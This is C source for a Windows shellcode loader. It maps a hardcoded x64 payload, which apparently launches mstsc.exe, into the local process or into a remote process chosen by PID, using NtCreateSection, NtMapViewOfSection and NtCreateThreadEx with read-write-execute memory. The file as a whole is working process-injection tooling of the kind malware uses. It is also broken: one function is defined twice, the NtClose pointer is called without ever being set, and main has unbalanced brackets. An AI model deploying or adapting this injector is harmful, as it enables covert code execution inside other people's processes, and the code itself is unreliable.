#include <Windows.h>
#include <stdio.h>
#include "Structs.h"
#include <windef.h>

//#define LocalInject
#ifndef LocalInject

#define RemoteInject
#define PID 1234

#endif // !LocalInject

// this can be used instead of `SECTION_ALL_ACCESS` in NtCreateSection
#define SECTION_RWX (SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE)

// mstsc.exe
unsigned char Shellcode[] = { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,
0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,
0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x6d,0x73,0x74,
0x73,0x63,0x2e,0x65,0x78,0x65,0x00 };

// Structure that holds function pointers to system calls
typedef struct _Syscalls {
	fnNtCreateSection		pNtCreateSection;
	fnNtMapViewOfSection	pNtMapViewOfSection;
	fnUnmapViewOfSection	pNtUnmapViewOfSection;
	fnNtClose				pNtClose;
	fnNtCreateThreadEx		pNtCreateThreadEx;
}Syscall, * PSyscall;

BOOL InitStruct(_Out_ PSyscall Struct) {
	// Get Handle NTDLL.dll
	HMODULE hModule = GetModuleHandle(L"NTDLL.DLL");
	if (!hModule) {
		printf("[!] GetModuleHandle Failed With Error Code: %d \n", GetLastError());
		return FALSE;
	}

	// Assign function pointers by getting the addresses from the loaded module
	Struct->pNtCreateSection = (fnNtCreateSection)GetProcAddress(hModule, "NtCreateSection");
	Struct->pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddress(hModule, "NtMapViewOfSection");
	Struct->pNtUnmapViewOfSection = (fnUnmapViewOfSection)GetProcAddress(hModule, "NtUnmapViewOfSection");
	Struct->pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddress(hModule, "NtCreateThreadEx");

	// Check if any function pointer is NULL, indicating a failure in getting the address
	if (!Struct->pNtCreateSection || !Struct->pNtMapViewOfSection || !Struct->pNtUnmapViewOfSection || !Struct->pNtCreateThreadEx) {
		printf("[!] Error getting function addresses. GetLastError: %d\n", GetLastError());
		return FALSE;
	}
	return TRUE;
}

// Function to initialize the Syscall structure with function pointers
BOOL InitStruct(_Out_ PSyscall Struct) {
    // Get Handle to NTDLL.dll
    HMODULE hModule = GetModuleHandle(L"NTDLL.DLL");
    if (!hModule) {
        printf("[!] GetModuleHandle Failed With Error Code: %d \n", GetLastError());
        return FALSE;
    }

    // Assign function pointers by getting the addresses from the loaded module
    Struct->pNtCreateSection = (fnNtCreateSection)GetProcAddress(hModule, "NtCreateSection");
    Struct->pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddress(hModule, "NtMapViewOfSection");
    Struct->pNtUnmapViewOfSection = (fnUnmapViewOfSection)GetProcAddress(hModule, "NtUnmapViewOfSection");
    Struct->pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddress(hModule, "NtCreateThreadEx");

    // Check if any function pointer is NULL, indicating a failure in getting the address
    if (!Struct->pNtCreateSection || !Struct->pNtMapViewOfSection || !Struct->pNtUnmapViewOfSection || !Struct->pNtCreateThreadEx) {
        printf("[!] Error getting function addresses. GetLastError: %d\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

#ifdef LocalInject

// Function to perform local mapping of a payload
BOOL LocalMappingSyscall(_In_ PVOID pPayload, IN SIZE_T sPayloadSize) {
    // Forward Declarations
    HANDLE hSection, hThread = { 0 };
    PVOID pAddress = { 0 };
    NTSTATUS STATUS = NULL;
    SIZE_T sViewSize = { 0 };
    LARGE_INTEGER MaximumSize;
    MaximumSize.HighPart = 0;
    MaximumSize.LowPart = sPayloadSize;
    Syscall Struct = { 0 };

    // Provide Structure with Loaded Modules
    if (!InitStruct(&Struct)) {
        printf("[!] Unable to Initialize Structure!\n");
        return FALSE;
    }

    // Create Local Map View object
    if ((STATUS = Struct.pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf("[!] NtCreateSection Failed With Error Code: 0x%0.8X \n", STATUS);
        return FALSE;
    }

    // Allocate Memory for Map View Object
    if ((STATUS = Struct.pNtMapViewOfSection(hSection, (HANDLE)-1, &pAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf("[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    }
    printf("[+] Memory Allocated At: 0x%p\n", pAddress);

    // Copy payload to pAddress
    memcpy(pAddress, pPayload, sPayloadSize);
    printf("[+] Copied Payload From 0x%p To 0x%p\n", pPayload, pAddress);

    // Creating and running thread
    printf("\t[i] Running Thread Of Entry 0x%p ... ", pAddress);
    if ((STATUS = Struct.pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    }

    printf("\t[*] Created With ThreadID %d\n", GetThreadId(hThread));

    // Close Map View Object
    if ((STATUS = Struct.pNtClose(hSection)) != 0) {
        printf("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    }

    return TRUE;
}
#endif

#ifdef RemoteInject
BOOL RemoteMappingSyscall(_In_ HANDLE hProcess, _In_ PVOID pPayload, _In_ SIZE_T sPayloadSize) {
    // Forward Declarations
    HANDLE				hSection = NULL;
    HANDLE				hThread = NULL;
    PVOID				pLocalAddress = NULL, pRemoteAddress = NULL;
    NTSTATUS			STATUS = NULL;
    SIZE_T				sViewSize = NULL;
    LARGE_INTEGER MaximumSize;
    MaximumSize.HighPart = 0;
    MaximumSize.LowPart = sPayloadSize;

    Syscall				Struct = { 0 };

    // Provide Structure with Loaded Modules
    if (!InitStruct(&Struct)) {
        printf("[!] Unable to Initialize Structure!\n");
        return FALSE;
    }

    // Create Local Map View object
    if ((STATUS = Struct.pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf("[!] NtCreateSection Failed With Error Code: 0x%0.8X \n", STATUS);
        return FALSE;
    }

    // Allocate Memory for Map View Object
    if ((STATUS = Struct.pNtMapViewOfSection(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf("[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    }
    printf("[+] Local Memory Allocated At: 0x%p\n", pLocalAddress);

    // Copy payload to pAddress
    memcpy(pLocalAddress, pPayload, sPayloadSize);
    printf("[+] Copied Payload From 0x%p To 0x%p\n", pPayload, pLocalAddress);

    // Create remote view object
    if ((STATUS = Struct.pNtMapViewOfSection(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    }
    printf("[+] Remote Memory Allocated At : 0x%p \n", pRemoteAddress);

    // Creating and running thread
    printf("[+] Running Thread Of Entry 0x%p ... ", pRemoteAddress);
    if ((STATUS = Struct.pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    }
    printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));

    // closing the section handle
    if ((STATUS = Struct.pNtClose(hSection)) != 0) {
        printf("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    }

    return TRUE;
}
#endif


int main() {
    // Local Injection
#ifdef LocalInject
    if (!LocalMappingSyscall(Shellcode, sizeof(Shellcode) {
        printf("[!} LocalMappingSyscall Failed!\n");
        return 1;

#endif

#ifdef RemoteInject
    printf("[+] Target Process ID: %d \n", PID);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    if (!RemoteMappingSyscall(hProcess, Shellcode, sizeof(Shellcode))) {
        return 1;
    }
#endif

}